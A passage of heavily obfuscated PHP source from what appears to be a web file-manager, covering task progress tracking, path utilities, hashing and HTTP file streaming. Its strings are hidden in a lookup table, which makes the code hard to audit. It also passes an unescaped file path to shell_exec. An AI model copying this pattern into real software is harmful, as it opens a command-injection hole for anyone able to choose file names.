$îµñê‚Ò[$°Á¼ Ñä[1735]]; $this->update(1); self::log($°Á¼ Ñä[1750] . $Æô’‹â¬); } public function sourceModelCopy($‘ë×ÊÀÆ) { $æÂ£ûÜê =& $_SERVER[³·—™¤¢]; $²×•¤æ‹ = $‘ë×ÊÀÆ[0]; $¦åâé‰² = $‘ë×ÊÀÆ[1]; $ªïÍ´Ú¢ =& $this->task; $this->sourceModelCopyFlag = !0; $»ŒÎàÜ¡ = 0; switch ($²×•¤æ‹) { case $æÂ£ûÜê[572]: $»ŒÎàÜ¡ = 1; break; case $æÂ£ûÜê[575]: $ªïÍ´Ú¢[$æÂ£ûÜê[1729]] = $¦åâé‰²[$æÂ£ûÜê[32]]; break; case $æÂ£ûÜê[577]: $»ŒÎàÜ¡ = intval($‘ë×ÊÀÆ[$æÂ£ûÜê[380]] * 0.4); break; case $æÂ£ûÜê[579]: $»ŒÎàÜ¡ = intval($‘ë×ÊÀÆ[$æÂ£ûÜê[380]] * 0.2); break; case $æÂ£ûÜê[581]: $»ŒÎàÜ¡ = intval($‘ë×ÊÀÆ[$æÂ£ûÜê[380]] * 0.4); break; } $this->update($»ŒÎàÜ¡); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ô‘‡ââŞ, $›ÒîĞ¥È) { $¯ĞºÍÅÍ =& $_SERVER[³·—™¤¢]; $this->sourceModelCopyFlag = !0; $ÌóÎ—‘Ú = 1; if (isset($Ô‘‡ââŞ[$¯ĞºÍÅÍ[79]])) { $ÌóÎ—‘Ú = $Ô‘‡ââŞ[$¯ĞºÍÅÍ[79]][$¯ĞºÍÅÍ[77]]; $ÌóÎ—‘Ú = $ÌóÎ—‘Ú + $Ô‘‡ââŞ[$¯ĞºÍÅÍ[79]][$¯ĞºÍÅÍ[78]] + 1; } $this->update($ÌóÎ—‘Ú); $this->sourceModelCopyFlag = !1; } public function sourceMove($Ú¯¾ÂŸ) { $this->sourceRemove($Ú¯¾ÂŸ, !1); } public function curlProgress($¨ëˆÖÊ¨, $º«˜¼è, $¡Ö ¿ïØ, $¢õ°¾íÂ, $ÍÌ…¿ı“) { $¶€éùÜ¬ =& $_SERVER[³·—™¤¢]; $©õÊ„¸¢ =& $this->task; if ($ÍÌ…¿ı“ > 0) { $©õÊ„¸¢[$¶€éùÜ¬[1087]] = $¶€éùÜ¬[1751]; $©õÊ„¸¢[$¶€éùÜ¬[1733]] = $¶€éùÜ¬[107]; if ($©õÊ„¸¢[$¶€éùÜ¬[1731]]) { $©õÊ„¸¢[$¶€éùÜ¬[1732]] = $ÍÌ…¿ı“; } if ($©õÊ„¸¢[$¶€éùÜ¬[1734]]) { $©õÊ„¸¢[$¶€éùÜ¬[1732]] = $ÍÌ…¿ı“ + $©õÊ„¸¢[$¶€éùÜ¬[1734]]; } } else { if ($¡Ö ¿ïØ > 0) { if ($©õÊ„¸¢[$¶€éùÜ¬[1731]] == $º«˜¼è) { $©õÊ„¸¢[$¶€éùÜ¬[1732]] = $¡Ö ¿ïØ; $©õÊ„¸¢[$¶€éùÜ¬[1087]] = $¶€éùÜ¬[1752]; $©õÊ„¸¢[$¶€éùÜ¬[1733]] = $¶€éùÜ¬[1222]; } } } $this->update(); } public function curlProgressStart($½¿Å©æ) { } public function curlProgressEnd($ĞíÀø«İ) { $ßêÛñ¥¶ =& $_SERVER[³·—™¤¢]; $Œ¿ÏÒé° =& $this->task; $¥¨•ºŸ¢ = curl_getinfo($ĞíÀø«İ); $éîöÊ‰« = $¥¨•ºŸ¢[$ßêÛñ¥¶[1753]]; if ($éîöÊ‰« == -1) { $éîöÊ‰« = $¥¨•ºŸ¢[$ßêÛñ¥¶[1754]]; } if ($Œ¿ÏÒé°[$ßêÛñ¥¶[1733]] == $ßêÛñ¥¶[107] && $éîöÊ‰«) { $Œ¿ÏÒé°[$ßêÛñ¥¶[1734]] += $éîöÊ‰«; } $this->update(); } } goto a‡ÇµåÌôÃ; d÷…›ôŠƒË: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $µÒè¤Ø½ =& $_SERVER[³·—™¤¢]; $this->objectDriver = array($µÒè¤Ø½[60], $µÒè¤Ø½[61], $µÒè¤Ø½[62], $µÒè¤Ø½[63], $µÒè¤Ø½[64], $µÒè¤Ø½[65], $µÒè¤Ø½[66], $µÒè¤Ø½[67], $µÒè¤Ø½[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($à°Â€€) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($à°Â€€, $_SERVER[³·—™¤¢][8]); } return $à°Â€€; } public function iconvApp($á£¿¿) { return $á£¿¿; } public function iconvSystem($Ê‹¬ë°à) { return $Ê‹¬ë°à; } public function iconvTo($áÍíè€, $˜‘“­, $ëøÄ¨ï¼) { $õÇæ´ô =& $_SERVER[³·—™¤¢]; if (!$áÍíè€ || !function_exists($õÇæ´ô[69])) { return $áÍíè€; } static $ı‚ø¡ş› = array(); $†ãâºÇ× = $˜‘“­ . $õÇæ´ô[70] . $ëøÄ¨ï¼ . $õÇæ´ô[71] . $áÍíè€; if (isset($ı‚ø¡ş›[$†ãâºÇ×])) { return $ı‚ø¡ş›[$†ãâºÇ×]; } if (function_exists($õÇæ´ô[72])) { $ƒ«ï´Ç = @mb_convert_encoding($áÍíè€, $ëøÄ¨ï¼, $˜‘“­); } else { $ƒ«ï´Ç = @iconv($˜‘“­, $ëøÄ¨ï¼, $áÍíè€); } $ƒ«ï´Ç = $ƒ«ï´Ç ? $ƒ«ï´Ç : $áÍíè€; if (strstr($ƒ«ï´Ç, $õÇæ´ô[73])) { $ƒ«ï´Ç = str_replace($õÇæ´ô[73], $õÇæ´ô[11], $ƒ«ï´Ç); } $ı‚ø¡ş›[$˜‘“­ . $õÇæ´ô[70] . $ëøÄ¨ï¼ . $õÇæ´ô[71] . $áÍíè€] = $ƒ«ï´Ç; $ı‚ø¡ş›[$ëøÄ¨ï¼ . $õÇæ´ô[70] . $˜‘“­ . $õÇæ´ô[71] . $áÍíè€] = $áÍíè€; $ı‚ø¡ş›[$ëøÄ¨ï¼ . $õÇæ´ô[70] . $˜‘“­ . $õÇæ´ô[71] . $ƒ«ï´Ç] = $áÍíè€; $ı‚ø¡ş›[$˜‘“­ . $õÇæ´ô[70] . $ëøÄ¨ï¼ . $õÇæ´ô[71] . $ƒ«ï´Ç] = $ƒ«ï´Ç; return $ƒ«ï´Ç; } public function getPathInner($­ÚåßÜˆ) { $î§ƒÓ® = IO::init($­ÚåßÜˆ); return $î§ƒÓ®->path; } public function getPathOuter($ôş¯îÔ…) { $ö¯ÄêÙ =& $_SERVER[³·—™¤¢]; $î˜ğ·– = strlen(trim($this->pathBase, $ö¯ÄêÙ[8])); $ôş¯îÔ… = substr(trim($ôş¯îÔ…, $ö¯ÄêÙ[8]), $î˜ğ·–); return $this->pathDriver . $ö¯ÄêÙ[8] . ltrim($ôş¯îÔ…, $ö¯ÄêÙ[8]); } public function isParentOf($·û«ÅÉ², $—÷äŠ¾) { $¡Ğ”Ë¨ =& $_SERVER[³·—™¤¢]; $·û«ÅÉ² = rtrim(strtolower($·û«ÅÉ²), $¡Ğ”Ë¨[8]) . $¡Ğ”Ë¨[8]; $—÷äŠ¾ = rtrim(strtolower($—÷äŠ¾), $¡Ğ”Ë¨[8]) . $¡Ğ”Ë¨[8]; $‘ÇüÒé = strpos($—÷äŠ¾, $·û«ÅÉ²) === 0; return $‘ÇüÒé; } public function getType() { $¨èÕ« =& $_SERVER[³·—™¤¢]; $ÅşÂùÏ® = str_replace($¨èÕ«[74], $¨èÕ«[12], get_class($this)); return strtolower($ÅşÂùÏ®); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ô”‚ÊÇÆ, $ÀÀü­ôÃ) { $§ıÏù =& $_SERVER[³·—™¤¢]; $òÅ¢ ½Ñ = rtrim($ô”‚ÊÇÆ, $§ıÏù[8]) . $§ıÏù[8] . $ÀÀü­ôÃ; $ÉÏ¯şË = $this->exist($òÅ¢ ½Ñ); return $ÉÏ¯şË ? $òÅ¢ ½Ñ : !1; } public function setModifyTime($¡¸ëİ€ú, $İ–´¬ÍË = '') { } public function renameObject($ÕÓŠ ¢ƒ, $’ÛÍ¹’­) { $ØŒµ¯ã = $’ÛÍ¹’­; $ÕÓŠ ¢ƒ = $this->getPathOuter($ÕÓŠ ¢ƒ); $’ÛÍ¹’­ = $this->pathFather($ÕÓŠ ¢ƒ) . $’ÛÍ¹’­; $ôÛÇß… = IO::copy($ÕÓŠ ¢ƒ, $this->pathFather($ÕÓŠ ¢ƒ), REPEAT_RENAME_FOLDER, $ØŒµ¯ã); if ($ôÛÇß…) { IO::remove($ÕÓŠ ¢ƒ); } return $ôÛÇß… ? $’ÛÍ¹’­ : !1; } public function tempFile($ÎÀèÎï² = '', $Ÿ×©«¦ = '') { if (!$ÎÀèÎï²) { $ÎÀèÎï² = rand_string(15); } $œÍèÄá¼ = TEMP_FILES . rand_string(15) . $_SERVER[³·—™¤¢][8]; @mkdir($œÍèÄá¼, DEFAULT_PERRMISSIONS, !0); $ÏÎâ‡İë = $œÍèÄá¼ . $ÎÀèÎï²; @touch($ÏÎâ‡İë); if ($Ÿ×©«¦) { file_put_contents($ÏÎâ‡İë, $Ÿ×©«¦); } return $ÏÎâ‡İë; } public function tempFileRemve($ùâÃ„˜) { @unlink($ùâÃ„˜); @rmdir($this->pathFather($ùâÃ„˜)); } public function mkfile($˜¸¹¶Áİ, $˜ÇÊ²ÚÉ = '', $£ÊÒû‡Æ = REPEAT_RENAME) { } public function mkdir($­Ûûƒ, $„íÃöøæ = REPEAT_SKIP) { } public function delFile($Ñß±óÊ) { } public function delFolder($éºŞÀÍ€) { } public function copyFile($¥·Šë˜ö, $ë‡É¢‹®) { } public function moveFile($ûú¢›±´, $­ Íû) { } public function remove($©Â¢ä˜ë) { if ($this->isFile($©Â¢ä˜ë)) { return $this->delFile($©Â¢ä˜ë); } return $this->delFolder($©Â¢ä˜ë); } public function rename($’ˆ©İ•, $„ÊâÃ¾À) { } public function exist($İêœşÚÂ) { } public function findByHash($…á•À£Ù = '', $™¬çÓş¨ = '') { return !1; } public function isFile($Êì›“Áğ) { } public function isFolder($Ë’³²şá) { } public function size($ŠÙòÓÎ) { } public function info($ÓØ£ª£€) { } public function infoSimple($ğºë³ÈŞ) { return $this->info($ğºë³ÈŞ); } public function infoAuth($…×ƒÉÑ‹) { return $this->info($…×ƒÉÑ‹); } public function infoFull($†“Âï™­) { return $this->info($†“Âï™­); } public function infoWithChildren($ñ³«£õé) { $îıò²»™ =& $_SERVER[³·—™¤¢]; static $Í²ùãŠê = array(); if (isset($Í²ùãŠê[$ñ³«£õé])) { return $Í²ùãŠê[$ñ³«£õé]; } $ÉÖÁ­ıÑ = $this->info($ñ³«£õé); if ($ÉÖÁ­ıÑ && $ÉÖÁ­ıÑ[$îıò²»™[33]] == $îıò²»™[75]) { $”¨¯©¿ = array($îıò²»™[76] => 0, $îıò²»™[77] => 0, $îıò²»™[78] => 0); $this->infoChildren($ñ³«£õé, $”¨¯©¿); $ÉÖÁ­ıÑ[$îıò²»™[76]] = $”¨¯©¿[$îıò²»™[76]]; $ÉÖÁ­ıÑ[$îıò²»™[79]] = array($îıò²»™[80] => $”¨¯©¿[$îıò²»™[77]], $îıò²»™[81] => $”¨¯©¿[$îıò²»™[78]]); $Í²ùãŠê[$ñ³«£õé] = $ÉÖÁ­ıÑ; } return $ÉÖÁ­ıÑ; } public function listPath($©¢±ƒµà, $ÊáùÏöİ = false) { } public function has($¨—Ü Û¾, $ÉˆÏ¼ÕØ = false, $…Ù—±œ = false) { } public function canRead($€ƒËÄ“Ò) { } public function canWrite($·ñóæ™¾) { } public function getContent($èˆ£Íã¤) { } public function setContent($ƒ´û‘äà, $µÄç–Äó = '') { } protected function infoChildren($ÁĞ»”ÚÁ, &$ã’™à÷Æ) { $ïŸ„¬¾é =& $_SERVER[³·—™¤¢]; check_abort_echo(); $îñíşÉô = $this->listPath($ÁĞ»”ÚÁ, !0); $îñíşÉô = array_merge($îñíşÉô[$ïŸ„¬¾é[82]], $îñíşÉô[$ïŸ„¬¾é[83]]); foreach ($îñíşÉô as $¹¡Œâğš) { if ($¹¡Œâğš[$ïŸ„¬¾é[33]] == $ïŸ„¬¾é[75]) { $ã’™à÷Æ[$ïŸ„¬¾é[78]]++; $‘ŒÚ²Å® = $this->getPathInner($¹¡Œâğš[$ïŸ„¬¾é[84]]); $this->infoChildren($‘ŒÚ²Å®, $ã’™à÷Æ); } else { $ã’™à÷Æ[$ïŸ„¬¾é[77]]++; $ã’™à÷Æ[$ïŸ„¬¾é[76]] += $¹¡Œâğš[$ïŸ„¬¾é[76]]; } } } public function fileSubstr($¯¹áúİŞ, $öÓÜò¯À, $ïÎ­ÉĞ) { } public function listAll($×ôóû…) { } public function listAllMake($©¸€¹, &$¯²››Ò­) { $À”¬„À„ =& $_SERVER[³·—™¤¢]; check_abort_echo(); $£¶õ¯ã£ = $this->listPath($©¸€¹, !0); if (!$£¶õ¯ã£) { return; } $·­Ó–Ÿˆ = array_merge($£¶õ¯ã£[$À”¬„À„[82]], $£¶õ¯ã£[$À”¬„À„[83]]); foreach ($·­Ó–Ÿˆ as $™°È»Á») { $Ô´»£·õ = $™°È»Á»[$À”¬„À„[33]] == $À”¬„À„[75]; $ÕºÒ¢€« = array($À”¬„À„[84] => $™°È»Á»[$À”¬„À„[84]], $À”¬„À„[75] => $Ô´»£·õ); if (isset($™°È»Á»[$À”¬„À„[76]])) { $ÕºÒ¢€«[$À”¬„À„[76]] = $™°È»Á»[$À”¬„À„[76]]; } if (isset($™°È»Á»[$À”¬„À„[85]])) { $ÕºÒ¢€«[$À”¬„À„[85]] = $™°È»Á»[$À”¬„À„[85]]; } if (!$Ô´»£·õ) { $¯²››Ò­[] = $ÕºÒ¢€«; continue; } $¯²››Ò­[] = $ÕºÒ¢€«; $ÇñÙÑ¡® = $™°È»Á»[$À”¬„À„[84]]; $Íš¥±Ë = $this->pathDriver; if (substr($™°È»Á»[$À”¬„À„[84]], 0, strlen($Íš¥±Ë)) == $Íš¥±Ë) { $ÇñÙÑ¡® = substr($ÇñÙÑ¡®, strlen($Íš¥±Ë)); } $this->listAllMake($ÇñÙÑ¡®, $¯²››Ò­); } } public function listAllSimple($ÕÍÕ¦ƒ) { $§±ãÜ¨Ø =& $_SERVER[³·—™¤¢]; $ûÖ¹ß¥æ = array(); $­ãô¦¥ = $this->listAll($ÕÍÕ¦ƒ); $À´¸²ı° = $this->getPathOuter($ÕÍÕ¦ƒ); foreach ($­ãô¦¥ as $«œ±®) { $éáÅòó† = $«œ±®[$§±ãÜ¨Ø[84]]; $ëÉ×íâ» = $«œ±®[$§±ãÜ¨Ø[84]]; if (isset($«œ±®[$§±ãÜ¨Ø[86]])) { $éáÅòó† = $«œ±®[$§±ãÜ¨Ø[86]][$§±ãÜ¨Ø[84]]; $«œ±®[$§±ãÜ¨Ø[76]] = $«œ±®[$§±ãÜ¨Ø[86]][$§±ãÜ¨Ø[76]]; $«œ±®[$§±ãÜ¨Ø[85]] = $«œ±®[$§±ãÜ¨Ø[86]][$§±ãÜ¨Ø[85]]; } else { $ëÉ×íâ» = substr($«œ±®[$§±ãÜ¨Ø[84]], strlen(get_path_father($À´¸²ı°))); $ëÉ×íâ» = $§±ãÜ¨Ø[8] . ltrim($ëÉ×íâ», $§±ãÜ¨Ø[8]); } $ÌøŸˆ€‘ = array($§±ãÜ¨Ø[84] => $ëÉ×íâ», $§±ãÜ¨Ø[75] => $«œ±®[$§±ãÜ¨Ø[75]]); if (isset($«œ±®[$§±ãÜ¨Ø[76]]) && !$«œ±®[$§±ãÜ¨Ø[75]]) { $ÌøŸˆ€‘[$§±ãÜ¨Ø[76]] = $«œ±®[$§±ãÜ¨Ø[76]]; } if (isset($«œ±®[$§±ãÜ¨Ø[85]])) { $ÌøŸˆ€‘[$§±ãÜ¨Ø[85]] = $«œ±®[$§±ãÜ¨Ø[85]]; } if (!$«œ±®[$§±ãÜ¨Ø[75]]) { $ÌøŸˆ€‘[$§±ãÜ¨Ø[87]] = $éáÅòó†; } $ûÖ¹ß¥æ[] = $ÌøŸˆ€‘; } return $ûÖ¹ß¥æ; } public function upload($×˜ºÈßÇ, $Ğ‘Èøõ¯, $ûÄç³¸¿ = false, $–³âÒ = REPEAT_REPLACE) { } public function uploadFileByID($êƒÚø¨…, $ÒÉí†çÑ, $‚ÔşŒñº) { } public function uploadFileByPath($ÜŞ¦Ø¸ä, $Á·½Èæü, $ÊáàÁ§” = array()) { } public function isUploadServer() { $Æ—‘Âë¨ =& $_SERVER[³·—™¤¢]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Æ—‘Âë¨[88]) { return !0; } return $GLOBALS[$Æ—‘Âë¨[6]][$Æ—‘Âë¨[89]][$Æ—‘Âë¨[90]]; } public function isFileOutServer() { $¨ú¤šå‹ =& $_SERVER[³·—™¤¢]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¨ú¤šå‹[88]) { return !0; } return $GLOBALS[$¨ú¤šå‹[6]][$¨ú¤šå‹[89]][$¨ú¤šå‹[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ôŠªƒ¡º) { $Ô“Ü€ó =& $_SERVER[³·—™¤¢]; if (!$this->isCdnHost()) { return $ôŠªƒ¡º; } return str_replace(trim(get_url_root($ôŠªƒ¡º), $Ô“Ü€ó[8]), trim($this->cdnHost, $Ô“Ü€ó[8]), $ôŠªƒ¡º); } public function uploadLink($¹˜»ÇŠ, $×¶ŒĞÍª = 0) { $€Ï¯üÕİ =& $_SERVER[³·—™¤¢]; if ($this->isUploadServer()) { return; } $°Ó€øåÙ = $this->getType(); if (!in_array($°Ó€øåÙ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÔË ğà = 1024 * 1024 * 10; $ıìªèÏœ = $×¶ŒĞÍª <= $ÔË ğà ? $€Ï¯üÕİ[92] : $€Ï¯üÕİ[93]; $„ëÒÛÍÒ = (!$×¶ŒĞÍª ? 1 : ceil($×¶ŒĞÍª / pow(1024, 3))) * 3600 * 4; $æ«ÊÌ¶• = $this->{$ıìªèÏœ}($¹˜»ÇŠ, $„ëÒÛÍÒ); if ($æ«ÊÌ¶•) { $æ«ÊÌ¶•[$€Ï¯üÕİ[94]] = $¹˜»ÇŠ; $æ«ÊÌ¶•[$€Ï¯üÕİ[95]] = $°Ó€øåÙ; } return $æ«ÊÌ¶•; } public function uploadFormData($ºÖ¾µßô, $òôãŞ•± = 3600) { } public function multiUploadFormData($Ü¸ÛÅ¦æ, $©á”¥µ = 3600) { } public function download($Æ¼‚Óñø, $³èÄÈ›Œ) { } public function ext($•…åˆ) { $Ë˜ÄÂ¡ =& $_SERVER[³·—™¤¢]; if (strpos($•…åˆ, $Ë˜ÄÂ¡[8]) === -1) { $›æâƒæœ = $•…åˆ; } else { $›æâƒæœ = $this->pathThis($•…åˆ); } $ª»õ§·ü = $Ë˜ÄÂ¡[12]; if (strstr($›æâƒæœ, $Ë˜ÄÂ¡[10])) { $ª»õ§·ü = substr($›æâƒæœ, strrpos($›æâƒæœ, $Ë˜ÄÂ¡[10]) + 1); $ª»õ§·ü = strtolower($ª»õ§·ü); } if (strlen($ª»õ§·ü) > 3 && preg_match($Ë˜ÄÂ¡[96], $ª»õ§·ü, $ªÕ‡óä¶)) { $ª»õ§·ü = $Ë˜ÄÂ¡[12]; } return $ª»õ§·ü; } public function pathThis($Ö®Ç²ì’) { $¨ÒÆ°’Ú =& $_SERVER[³·—™¤¢]; $Ö®Ç²ì’ = str_replace($¨ÒÆ°’Ú[97], $¨ÒÆ°’Ú[8], rtrim($Ö®Ç²ì’, $¨ÒÆ°’Ú[8])); $÷ËÏŞ¡à = strrpos($Ö®Ç²ì’, $¨ÒÆ°’Ú[8]); if ($÷ËÏŞ¡à === !1) { return $Ö®Ç²ì’; } return substr($Ö®Ç²ì’, $÷ËÏŞ¡à + 1); } public function pathFather($À¯Ñ«¯¯) { $ŒÁËÕ¶ =& $_SERVER[³·—™¤¢]; $À¯Ñ«¯¯ = str_replace($ŒÁËÕ¶[97], $ŒÁËÕ¶[8], rtrim($À¯Ñ«¯¯, $ŒÁËÕ¶[8])); $Àûâ“ˆª = strrpos($À¯Ñ«¯¯, $ŒÁËÕ¶[8]); if ($Àûâ“ˆª === !1) { return $ŒÁËÕ¶[12]; } return substr($À¯Ñ«¯¯, 0, $Àûâ“ˆª + 1); } public function hashSimple($›˜³×˜¢) { $¤ˆé’Ë· =& $_SERVER[³·—™¤¢]; if (!$›˜³×˜¢) { return md5($¤ˆé’Ë·[12]); } $É¬€–£¬ = $this->size($›˜³×˜¢); $ÀŠåı¿ = 200; $™šãç‹¤ = 50; if ($É¬€–£¬ <= $ÀŠåı¿ * $™šãç‹¤) { return $this->hashMd5($›˜³×˜¢) . $É¬€–£¬; } $¢Ÿ£ÔÍÛ = intval($É¬€–£¬ / $™šãç‹¤); $Í–ÃáŠš = $¤ˆé’Ë·[12]; for ($Ã‚Ôìùô = 0; $Ã‚Ôìùô < $™šãç‹¤; $Ã‚Ôìùô++) { $Í–ÃáŠš .= $this->fileSubstr($›˜³×˜¢, $¢Ÿ£ÔÍÛ * $Ã‚Ôìùô, $ÀŠåı¿); } $Í–ÃáŠš .= $this->fileSubstr($›˜³×˜¢, $É¬€–£¬ - $ÀŠåı¿, $ÀŠåı¿); return md5($Í–ÃáŠš) . $É¬€–£¬; } public static $md5Cache = array(); public function hashMd5($œï¢÷Å¦) { if (!$œï¢÷Å¦) { return md5($_SERVER[³·—™¤¢][12]); } $œï¢÷Å¦ = $this->iconvSystem($œï¢÷Å¦); if (isset(self::$md5Cache[$œï¢÷Å¦])) { return self::$md5Cache[$œï¢÷Å¦]; } self::$md5Cache[$œï¢÷Å¦] = $this->hashMd5Shell($œï¢÷Å¦); if (!self::$md5Cache[$œï¢÷Å¦]) { self::$md5Cache[$œï¢÷Å¦] = @md5_file($œï¢÷Å¦); } return self::$md5Cache[$œï¢÷Å¦]; } private function hashMd5Shell($ğ¦šéÄ‹) { $ä´¯ô›Ä =& $_SERVER[³·—™¤¢]; if (!$ğ¦šéÄ‹) { return md5($ä´¯ô›Ä[12]); } if (!function_exists($ä´¯ô›Ä[98])) { return !1; } $Èù×ˆú© = array($ä´¯ô›Ä[99], $ä´¯ô›Ä[100]); $¥Ñ€ÅÊ§ = Cache::get($ä´¯ô›Ä[101]); if (!$¥Ñ€ÅÊ§) { $ú£ÈÅøË = BASIC_PATH . $ä´¯ô›Ä[102]; $ãÚ¨ç¬İ = md5_file($ú£ÈÅøË); $¥Ñ€ÅÊ§ = $ä´¯ô›Ä[103]; foreach ($Èù×ˆú© as $È¿íûäô) { $¿ğŠŠìŞ = shell_exec($È¿íûäô . "\x20\42{$ú£ÈÅøË}\x22"); if ($¿ğŠŠìŞ && substr(trim($¿ğŠŠìŞ), 0, 32) == $ãÚ¨ç¬İ) { $¥Ñ€ÅÊ§ = $È¿íûäô; break; } } Cache::set($ä´¯ô›Ä[101], $¥Ñ€ÅÊ§, 3600); } if ($¥Ñ€ÅÊ§ == $ä´¯ô›Ä[103]) { return !1; } $¿ğŠŠìŞ = shell_exec($¥Ñ€ÅÊ§ . "\40\x22{$ğ¦šéÄ‹}\42"); $¿ğŠŠìŞ = str_replace($ä´¯ô›Ä[104], $ä´¯ô›Ä[12], $¿ğŠŠìŞ); return substr($¿ğŠŠìŞ, 0, 32); } public function link($‚ôí’») { return $‚ôí’»; } public function fileOut($™Íû€Æ, $ÊÕåš€ø = false, $æÚê®ô = false, $éÊêÚè = '') { $“Ë¶­–× =& $_SERVER[³·—™¤¢]; $this->cacheMethod(null, null); if (!$™Íû€Æ || !$this->exist($™Íû€Æ)) { show_json(LNG($“Ë¶­–×[105]), !1, $æÚê®ô); } $üĞşå¶ = $this->getType() == $“Ë¶­–×[106]; $”ñé¿Èá = $GLOBALS[$“Ë¶­–×[6]][$“Ë¶­–×[89]][$“Ë¶­–×[107]][$“Ë¶­–×[108]]; $¤ÒÚ’Ó› = (double) $GLOBALS[$“Ë¶­–×[6]][$“Ë¶­–×[89]][$“Ë¶­–×[107]][$“Ë¶­–×[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $†–ÁÄÚ¿ = $this->infoFull($™Íû€Æ); $ì†§é½­ = $†–ÁÄÚ¿[$“Ë¶­–×[76]]; $À¯®ø›ù = gmdate($“Ë¶­–×[110], $†–ÁÄÚ¿[$“Ë¶­–×[85]]); $ç¶ äÄº = $æÚê®ô ? $æÚê®ô : $this->iconvApp($†–ÁÄÚ¿[$“Ë¶­–×[32]]); $Õ¸ôœÏÔ = 0; $”ˆéÏ¿² = $ì†§é½­ - 1; $™òúŠ¿› = $this->ext($ç¶ äÄº); if (in_array($™òúŠ¿›, array($“Ë¶­–×[111], $“Ë¶­–×[112], $“Ë¶­–×[113], $“Ë¶­–×[114]))) { $™òúŠ¿› = $“Ë¶­–×[115]; } if (in_array($™òúŠ¿›, array($“Ë¶­–×[116]))) { $™òúŠ¿› = $“Ë¶­–×[117]; } if (!$éÊêÚè) { $éÊêÚè = md5($À¯®ø›ù . $this->hashSimple($™Íû€Æ)); } $éÊêÚè = $“Ë¶­–×[118] . $éÊêÚè . $“Ë¶­–×[118]; $èùé“×¢ = get_file_mime($™òúŠ¿›); $ÜÃ—Ò× = !0; $ÜÃ—Ò× = isset($_GET[$“Ë¶­–×[119]]) ? !1 : !0; if ($ÊÕåš€ø === !1 && !mime_support($èùé“×¢)) { $èùé“×¢ = $“Ë¶­–×[120]; } header($“Ë¶­–×[121]); header($“Ë¶­–×[122] . $èùé“×¢); $ïÏõİšİ = rawurlencode($ç¶ äÄº); $ïÏõİšİ = $“Ë¶­–×[118] . $ïÏõİšİ . $“Ë¶­–×[123] . $ïÏõİšİ; if ($ÊÕåš€ø) { header($“Ë¶­–×[124]); header($“Ë¶­–×[125] . $ïÏõİšİ); } else { if ($ÜÃ—Ò×) { header($“Ë¶­–×[126] . $ïÏõİšİ); } } header($“Ë¶­–×[127] . gmdate($“Ë¶­–×[110], time() + 3600 * 24 * 30) . $“Ë¶­–×[128]); header($“Ë¶­–×[129]); header($“Ë¶­–×[130]); header($“Ë¶­–×[131]); if (isset($_SERVER[$“Ë¶­–×[132]]) && strtotime($_SERVER[$“Ë¶­–×[132]]) == $†–ÁÄÚ¿[$“Ë¶­–×[85]]) { header($“Ë¶­–×[133], !0, 304); die; } if (isset($_SERVER[$“Ë¶­–×[134]]) && $_SERVER[$“Ë¶­–×[134]] == $éÊêÚè) { header($“Ë¶­–×[135] . $éÊêÚè, !0, 304); die; } header($“Ë¶­–×[135] . $éÊêÚè); header($“Ë¶­–×[136] . $À¯®ø›ù . $“Ë¶­–×[128]); header($“Ë¶­–×[137] . $ç¶ äÄº); header($“Ë¶­–×[138]); header($“Ë¶­–×[139] . $ì†§é½­); header($“Ë¶­–×[140]); if (!$ÊÕåš€ø && $™òúŠ¿› == $“Ë¶­–×[141]) { if ($ì†§é½­ > 1024 * 1024 * 5) { die; } $·Á‡Ì‰› = $this->getContent($™Íû€Æ); $·Á‡Ì‰› = Html::clearSVG($·Á‡Ì‰›); header($“Ë¶­–×[142] . strlen($·Á‡Ì‰›)); echo $·Á‡Ì‰›; die; } $üÜ§Ô—ñ = strtolower($_SERVER[$“Ë¶­–×[143]]); if ($üĞşå¶ && $üÜ§Ô—ñ && $”ñé¿Èá) { if (strstr($üÜ§Ô—ñ, $“Ë¶­–×[144])) { header($“Ë¶­–×[145] . $™Íû€Æ); } else { if (strstr($üÜ§Ô—ñ, $“Ë¶­–×[146])) { header($“Ë¶­–×[147] . $™Íû€Æ); } else { if (strstr($üÜ§Ô—ñ, $“Ë¶­–×[148])) { header($“Ë¶­–×[149] . $™Íû€Æ); } } } if ($¤ÒÚ’Ó›) { header($“Ë¶­–×[150] . $¤ÒÚ’Ó›); } return; } if (isset($_SERVER[$“Ë¶­–×[151]])) { if (preg_match($“Ë¶­–×[152], $_SERVER[$“Ë¶­–×[151]], $Ì„·àÇü)) { $Õ¸ôœÏÔ = intval($Ì„·àÇü[1]); if (!empty($Ì„·àÇü[2])) { $”ˆéÏ¿² = intval($Ì„·àÇü[2]); } } header($“Ë¶­–×[153]); header("\x43\x6f\x6e\164\145\x6e\x74\x2d\122\141\x6e\x67\x65\72\40\x62\x79\164\x65\x73\40{$Õ¸ôœÏÔ}\55{$”ˆéÏ¿²}\57" . $ì†§é½­); } else { header($“Ë¶­–×[154]); } header($“Ë¶­–×[155]); $…¼Èæ³õ = !0; if ($_SERVER[$“Ë¶­–×[156]] == $“Ë¶­–×[157] && $ì†§é½­ > 1204 * 1024 * 1024 * 2) { $…¼Èæ³õ = !1; } if ($…¼Èæ³õ) { header($“Ë¶­–×[158] . ($”ˆéÏ¿² - $Õ¸ôœÏÔ + 1)); } if ($_SERVER[$“Ë¶­–×[159]] == $“Ë¶­–×[160]) { return; } $˜ª²Õ·Ø = 1024 * 100; $§îûäº– = 0; if ($¤ÒÚ’Ó›) { $§îûäº– = intval(1000 * 1000 * ($˜ª²Õ·Ø / $¤ÒÚ’Ó›)); } while ($Õ¸ôœÏÔ <= $”ˆéÏ¿²) { $Ô«Ì©Òø = timeFloat(); check_abort(); $áÙßş©Í = $”ˆéÏ¿² - $Õ¸ôœÏÔ + 1; if ($áÙßş©Í <= $˜ª²Õ·Ø) { $˜ª²Õ·Ø = $áÙßş©Í; } echo $this->fileSubstr($™Íû€Æ, 